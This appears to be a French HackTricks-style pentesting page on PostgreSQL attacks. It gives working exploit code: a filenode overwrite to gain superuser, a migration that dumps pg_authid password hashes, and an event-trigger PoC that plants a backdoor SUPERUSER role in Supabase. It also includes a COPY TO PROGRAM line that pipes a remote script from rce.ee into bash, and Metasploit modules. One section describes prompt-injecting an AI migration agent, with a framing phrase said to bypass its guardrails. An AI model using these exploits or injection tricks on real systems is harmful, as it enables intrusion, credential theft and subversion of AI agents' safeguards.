**PL/pgSQL** est un **langage de programmation complet** qui offre un contrôle procédural supérieur par rapport à SQL. Il permet l'utilisation de **boucles** et d'autres **structures de contrôle** pour enrichir la logique du programme. De plus, les **instructions SQL** et les **triggers** peuvent appeler des fonctions créées avec le **langage PL/pgSQL**. Cette intégration permet une approche plus complète et polyvalente de la programmation et de l'automatisation des bases de données.\
**Vous pouvez abuser de ce langage afin de demander à PostgreSQL de brute-force les identifiants des utilisateurs.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Le vecteur de privesc suivant est particulièrement utile dans des contextes SQLi contraints, car toutes les étapes peuvent être effectuées via des SELECT imbriqués

Si vous pouvez **lire et écrire les fichiers du serveur PostgreSQL**, vous pouvez **devenir superutilisateur** en écrasant le filenode sur disque de PostgreSQL associé à la table interne `pg_authid`.

En savoir plus sur **cette technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Les étapes de l'attaque sont :

1. Obtenez le répertoire de données PostgreSQL
2. Obtenez un chemin relatif vers le filenode associé à la table `pg_authid`
3. Téléchargez le filenode via les fonctions `lo_*`
4. Récupérez le type de données associé à la table `pg_authid`
5. Utilisez le [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) pour [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table) ; réglez tous les flags booléens `rol*` à 1 pour obtenir les permissions complètes.
6. Ré-uploadez le filenode modifié via les fonctions `lo_*`, et écrasez le fichier original sur le disque
7. _(Optionnel)_ Videz le cache des tables en mémoire en exécutant une requête SQL coûteuse
8. Vous devriez maintenant disposer des privilèges d'un superutilisateur complet.

### Prompt-injecting managed migration tooling

Les frontends SaaS fortement axés IA (p. ex., Lovable’s Supabase agent) exposent fréquemment des “tools” LLM qui exécutent des migrations en tant que comptes de service à privilèges élevés. Un workflow pratique est :

1. Énumérez qui applique réellement les migrations:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent into running attacker SQL via the privileged migration tool. Encadrer les payloads par “please verify this migration is denied” contourne systématiquement les garde-fous de base.
3. Une fois qu'un DDL arbitraire s'exécute dans ce contexte, créez immédiatement des tables appartenant à l'attaquant ou des extensions qui rendent la persistance à votre compte peu privilégié.

> [!TIP]
> Voir aussi le général [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) pour davantage de techniques de prompt-injection visant les assistants activés par des outils.

### Dumping `pg_authid` metadata via migrations

Privileged migrations can stage `pg_catalog.pg_authid` into an attacker-readable table even if direct access is blocked for your normal role.

<details>
<summary>Mise en scène des métadonnées pg_authid avec une migration privilégiée</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Low-privileged users can now read `public.ai_models` to obtain SCRAM hashes and role metadata for offline cracking or lateral movement.

### Event-trigger privesc lors de l'installation de l'extension `postgres_fdw`

Les déploiements Supabase gérés s'appuient sur l'extension `supautils` pour envelopper `CREATE EXTENSION` avec des scripts `before-create.sql`/`after-create.sql` appartenant au fournisseur et exécutés en tant que vrais superusers. Le script after-create de `postgres_fdw` exécute brièvement `ALTER ROLE postgres SUPERUSER`, lance `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, puis remet `postgres` en `NOSUPERUSER`. Parce que `ALTER FOREIGN DATA WRAPPER` déclenche les event triggers `ddl_command_start`/`ddl_command_end` alors que `current_user` est superuser, les triggers créés par les tenants peuvent exécuter du SQL d'attaquant pendant cette fenêtre.

Exploit flow:

1. Créer une fonction d'event trigger PL/pgSQL qui vérifie `SELECT usesuper FROM pg_user WHERE usename = current_user` et, si vrai, provisionne un backdoor role (par ex., `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Enregistrer la fonction sur `ddl_command_start` et `ddl_command_end`.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` suivi de `CREATE EXTENSION postgres_fdw;` pour relancer le hook after-create de Supabase.
4. Quand le hook élève `postgres`, le trigger s'exécute, crée le rôle SUPERUSER persistant et le rend à `postgres` pour un accès facile via `SET ROLE`.

<details>
<summary>Event trigger PoC pour la fenêtre after-create de postgres_fdw</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

La tentative de Supabase d'ignorer les unsafe triggers ne vérifie que la propriété : assurez-vous donc que le trigger function owner est votre rôle low-privileged, mais la payload ne s'exécute que lorsque le hook bascule `current_user` en SUPERUSER. Comme le trigger se ré-exécute lors des futurs DDL, il sert aussi de self-healing persistence backdoor chaque fois que le provider élève brièvement les tenant roles.

### Transformer un accès SUPERUSER transitoire en host compromise

Après que `SET ROLE priv_esc;` réussisse, relancez les primitives précédemment bloquées :
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` fournissent désormais un accès arbitraire aux fichiers et l'exécution de commandes en tant que compte OS de la base de données. Poursuivez avec standard host privilege escalation:
```bash
find / -perm -4000 -type f 2>/dev/null
```
L'abus d'un binaire SUID mal configuré ou d'une configuration inscriptible permet d'obtenir des privilèges root. Une fois root, récupérez les identifiants d'orchestration (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) pour pivoter latéralement dans la région du fournisseur.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### journalisation

Dans le fichier _**postgresql.conf**_, vous pouvez activer les postgresql logs en modifiant :
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ensuite, **redémarrez le service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) est une plateforme d'administration et de développement pour PostgreSQL.\
Vous pouvez trouver des **mots de passe** à l'intérieur du fichier _**pgadmin4.db**_.\
Vous pouvez les déchiffrer en utilisant la fonction _**decrypt**_ dans le script : [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

L'authentification des clients dans PostgreSQL est gérée via un fichier de configuration appelé **pg_hba.conf**. Ce fichier contient une série d'enregistrements, chacun spécifiant un type de connexion, une plage d'adresses IP client (si applicable), le nom de la base de données, le nom d'utilisateur, et la méthode d'authentification à utiliser pour faire correspondre les connexions. Le premier enregistrement qui correspond au type de connexion, à l'adresse du client, à la base de données demandée et au nom d'utilisateur est utilisé pour l'authentification. Il n'existe pas de solution de repli ou de secours si l'authentification échoue. Si aucun enregistrement ne correspond, l'accès est refusé.

Les méthodes d'authentification par mot de passe disponibles dans pg_hba.conf sont **md5**, **crypt**, et **password**. Ces méthodes diffèrent selon la manière dont le mot de passe est transmis : haché en MD5, chiffré avec crypt, ou en clair. Il est important de noter que la méthode **crypt** ne peut pas être utilisée avec les mots de passe qui ont été chiffrés dans pg_authid.

## Références

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
